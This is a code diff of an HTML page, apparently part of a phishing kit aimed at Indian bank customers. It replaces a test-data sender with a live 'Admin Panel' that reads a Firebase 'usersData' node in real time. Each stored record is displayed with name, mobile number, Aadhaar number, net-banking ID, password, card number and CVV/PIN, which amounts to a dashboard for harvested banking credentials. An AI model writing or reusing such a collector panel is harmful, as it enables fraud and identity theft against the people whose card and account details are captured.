@@ -1,13 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="hi">
 <head>
-  <meta charset="UTF-8">
-  <title>Add Data</title>
+<meta charset="UTF-8">
+<title>Admin Panel</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#f2f2f2;
+}
+header{
+  background:#0d6efd;
+  color:white;
+  padding:15px;
+  text-align:center;
+  font-size:20px;
+}
+.card{
+  background:#fff;
+  margin:10px;
+  padding:12px;
+  border-radius:8px;
+  box-shadow:0 2px 6px rgba(0,0,0,0.15);
+}
+.row{
+  padding:4px 0;
+  border-bottom:1px dashed #ddd;
+  font-size:14px;
+}
+.row:last-child{
+  border-bottom:none;
+}
+.label{
+  font-weight:bold;
+  color:#333;
+}
+.time{
+  font-size:12px;
+  color:gray;
+  margin-top:6px;
+}
+.empty{
+  text-align:center;
+  color:gray;
+  margin-top:30px;
+}
+</style>
 </head>
+
 <body>
 
-<h2>Send Test Data</h2>
-<button onclick="send()">SEND DATA</button>
+<header>ADMIN PANEL – LIVE DATA</header>
+
+<div id="dataList" class="empty">Loading...</div>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
@@ -21,19 +68,38 @@ var firebaseConfig = {
 };
 firebase.initializeApp(firebaseConfig);
 
-function send(){
-  firebase.database().ref("usersData").push({
-    fullName: "TEST USER",
-    mbno: "9999999999",
-    aadr: "XXXX-XXXX-1234",
-    nid: "YES",
-    pss: "SET",
-    cn: "CARD SET",
-    cvpn: "PIN SET",
-    time: new Date().toLocaleString()
+var db = firebase.database();
+var list = document.getElementById("dataList");
+
+/* 🔴 REAL-TIME + LINE BY LINE */
+db.ref("usersData").on("value", function(snapshot){
+  list.innerHTML = "";
+
+  if(!snapshot.exists()){
+    list.innerHTML = "<div class='empty'>No Data Found</div>";
+    return;
+  }
+
+  var all = [];
+  snapshot.forEach(function(child){
+    all.unshift(child.val()); // new data top
   });
-  alert("DATA SENT SUCCESSFULLY");
-}
+
+  all.forEach(function(d){
+    list.innerHTML += `
+      <div class="card">
+        <div class="row"><span class="label">Full Name :</span> ${d.fullName}</div>
+        <div class="row"><span class="label">Mobile :</span> ${d.mbno}</div>
+        <div class="row"><span class="label">Aadhaar :</span> ${d.aadr}</div>
+        <div class="row"><span class="label">NetBank :</span> ${d.nid}</div>
+        <div class="row"><span class="label">Password :</span> ${d.pss}</div>
+        <div class="row"><span class="label">Card No :</span> ${d.cn}</div>
+        <div class="row"><span class="label">CVV / PIN :</span> ${d.cvpn}</div>
+        <div class="time">Date : ${d.time}</div>
+      </div>
+    `;
+  });
+});
 </script>
 
 </body>
